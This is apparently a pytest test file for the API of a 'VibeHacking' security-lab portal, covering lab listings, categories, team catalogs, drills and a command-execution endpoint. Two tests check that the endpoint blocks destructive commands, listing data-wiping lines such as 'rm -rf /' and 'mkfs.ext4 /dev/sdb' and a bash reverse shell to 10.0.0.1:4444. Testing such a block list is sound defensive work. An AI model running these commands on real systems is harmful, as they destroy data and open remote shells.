#!/usr/bin/env python3
"""Tests for VibeHacking Unified Web Portal API."""

import sys
from pathlib import Path
REPO_ROOT = Path(__file__).resolve().parent.parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

import pytest
from starlette.testclient import TestClient
from portal.server import app


@pytest.fixture
def client():
    return TestClient(app)


def test_portal_home(client):
    res = client.get("/")
    assert res.status_code == 200
    assert "text/html" in res.headers["content-type"]
    assert "VibeHacking" in res.text or "VIBEHACKING" in res.text


def test_system_status(client):
    res = client.get("/api/system/status")
    assert res.status_code == 200
    data = res.json()
    assert "cpu_usage_percent" in data
    assert "total_labs" in data
    assert data["total_labs"] == 57


def test_list_labs(client):
    res = client.get("/api/labs")
    assert res.status_code == 200
    data = res.json()
    assert data["total"] == 57
    assert len(data["labs"]) == 57
    # Check Lab 19~57 presence
    ids = [l["id"] for l in data["labs"]]
    assert "19" in ids
    assert "20" in ids
    assert "54" in ids
    assert "55" in ids
    assert "56" in ids
    assert "57" in ids
    assert "21" in ids
    assert "22" in ids
    assert "23" in ids
    assert "24" in ids
    assert "25" in ids
    assert "26" in ids
    assert "27" in ids
    assert "28" in ids
    assert "29" in ids
    assert "30" in ids
    assert "31" in ids
    assert "32" in ids
    assert "33" in ids
    assert "34" in ids
    assert "35" in ids
    assert "36" in ids
    assert "37" in ids
    assert "38" in ids
    assert "39" in ids
    assert "40" in ids
    assert "41" in ids
    assert "42" in ids
    assert "43" in ids
    assert "44" in ids
    assert "45" in ids
    assert "46" in ids
    assert "47" in ids
    assert "48" in ids
    assert "49" in ids
    assert "50" in ids
    assert "51" in ids
    assert "52" in ids
    assert "53" in ids


def test_lab_logs(client):
    res = client.get("/api/labs/01/logs")
    assert res.status_code == 200
    data = res.json()
    assert "logs" in data
    assert "status" in data


def test_lab_exec(client):
    res = client.post("/api/labs/01/exec", json={"command": "echo 'VIBE_PORTAL_TEST'"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "success"
    assert "VIBE_PORTAL_TEST" in data["output"]


def test_lab_solve(client):
    res = client.get("/api/labs/19/solve?step=1")
    assert res.status_code == 200
    data = res.json()
    assert data["success"] is True
    assert "Frida" in data["name"]
    assert "FLAG{" in data["output"]


def test_lab_exec_blocked_dangerous_command(client):
    res = client.post("/api/labs/01/exec", json={"command": "rm -rf /"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "blocked"
    assert "위험한 시스템 파괴 명령어" in data["output"]


def test_lab_logs_bounded_tail(client):
    res = client.get("/api/labs/01/logs?tail=99999")
    assert res.status_code == 200
    data = res.json()
    assert "logs" in data


def test_list_labs_category_filter(client):
    res = client.get("/api/labs?category=database")
    assert res.status_code == 200
    data = res.json()
    assert data["total"] >= 1
    assert data["filter_category"] == "database"
    assert all(l["category"] == "database" for l in data["labs"])
    assert any(l["id"] == "36" for l in data["labs"])


def test_get_lab_categories(client):
    res = client.get("/api/labs/categories")
    assert res.status_code == 200
    data = res.json()
    assert data["total_labs"] == 57
    assert "ai" in data["categories"]
    assert "54" in data["categories"]["ai"]["labs"]
    assert "crypto" in data["categories"]
    assert "55" in data["categories"]["crypto"]["labs"]
    assert "ad" in data["categories"]
    assert "53" in data["categories"]["ad"]["labs"]
    assert "database" in data["categories"]
    assert "36" in data["categories"]["database"]["labs"]
    assert "network" in data["categories"]
    assert "52" in data["categories"]["network"]["labs"]
    assert "wireless" in data["categories"]
    assert "37" in data["categories"]["wireless"]["labs"]
    assert "endpoint" in data["categories"]
    assert "38" in data["categories"]["endpoint"]["labs"]
    assert "51" in data["categories"]["endpoint"]["labs"]
    assert "crypto" in data["categories"]
    assert "39" in data["categories"]["crypto"]["labs"]
    assert "45" in data["categories"]["crypto"]["labs"]
    assert "supplychain" in data["categories"]
    assert "41" in data["categories"]["supplychain"]["labs"]
    assert "cloud" in data["categories"]
    assert "42" in data["categories"]["cloud"]["labs"]
    assert "43" in data["categories"]["cloud"]["labs"]
    assert "web" in data["categories"]
    assert "44" in data["categories"]["web"]["labs"]
    assert "dfir" in data["categories"]
    assert "40" in data["categories"]["dfir"]["labs"]
    assert "50" in data["categories"]["dfir"]["labs"]
    assert data["total_categories"] >= 10


def test_batch_labs_control(client):
    res = client.post("/api/labs/batch/start", json={"category": "database"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "completed"
    assert data["targeted_count"] >= 1

    res = client.post("/api/labs/batch/stop", json={"category": "database"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "completed"


def test_lab_exec_blocked_regex_patterns(client):
    dangerous_payloads = [
        "rm -rf ~",
        "rm  -rf  /",
        "rm -r -f /",
        "mkfs.ext4 /dev/sdb",
        "cat /dev/zero > /dev/sda",
        "shutdown -h now",
        "bash -i >& /dev/tcp/10.0.0.1/4444",
    ]
    for cmd in dangerous_payloads:
        res = client.post("/api/labs/01/exec", json={"command": cmd})
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "blocked", f"Expected {cmd} to be blocked"
        assert "위험한 시스템 파괴 명령어" in data["output"]


def test_portal_teams_catalog(client):
    res = client.get("/api/teams")
    assert res.status_code == 200
    data = res.json()
    assert data["total_teams"] == 10
    teams_map = {t["id"]: t for t in data["teams"]}
    assert "red" in teams_map
    assert "blue" in teams_map
    assert "purple" in teams_map
    assert "re" in teams_map
    assert "antire" in teams_map
    assert "57" in teams_map["antire"]["labs"]
    assert "56" in teams_map["blue"]["labs"]


def test_portal_team_labs_status(client):
    res = client.get("/api/teams/antire/labs")
    assert res.status_code == 200
    data = res.json()
    assert data["team_id"] == "antire"
    assert data["total_labs"] == 3
    ids = [l["id"] for l in data["labs"]]
    assert "57" in ids

    # 404 test for unknown team
    res_404 = client.get("/api/teams/unknown_team/labs")
    assert res_404.status_code == 404


def test_portal_compliance_summary(client):
    res = client.get("/api/compliance/summary")
    assert res.status_code == 200
    data = res.json()
    assert data["total_labs"] == 57
    assert data["total_findings"] >= 57
    assert data["average_cvss"] > 0
    assert "Critical" in data["severity_counts"]
    assert "High" in data["severity_counts"]


def test_portal_drill_run_api(client):
    # Test specific team drill
    res = client.post("/api/drill/run", json={"team_id": "antire"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "SUCCESS"
    assert "antire" in data["team_breakdown"]
    assert data["overall_composite_score"] == 100.0

    # Test single lab drill
    res_lab = client.post("/api/drill/run", json={"lab_id": "57"})
    assert res_lab.status_code == 200
    data_lab = res_lab.json()
    assert data_lab["status"] == "SUCCESS"
    assert len(data_lab["drills"]) == 1
    assert data_lab["drills"][0]["lab_id"] == "57"


